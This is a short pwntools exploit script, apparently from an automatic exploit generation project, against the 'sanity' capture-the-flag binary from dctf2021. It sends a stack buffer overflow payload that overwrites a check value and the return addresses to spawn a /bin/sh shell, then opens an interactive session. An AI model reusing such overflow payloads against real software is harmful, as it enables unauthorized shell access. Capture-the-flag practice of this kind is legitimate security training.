from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/bofaeg_challenges/9_dctf2021_sanity/dctf2021_sanity")
pwn.gdb.attach(p)
payload = b""
payload += b'\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5u\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xb5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xde\xc0\xad\xde\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf56\x05@\x00\x00\x00\x00\x00\xdb\x06@\x00\x00\x00\x00\x00\n'
p.send(payload)
p.recvuntil(b'tell me a joke\nvery good, here is a shell for you. \nspawning /bin/sh process\nwush!\n$> If this is not good enough, you will just have to try harder :)\n')
p.interactive()
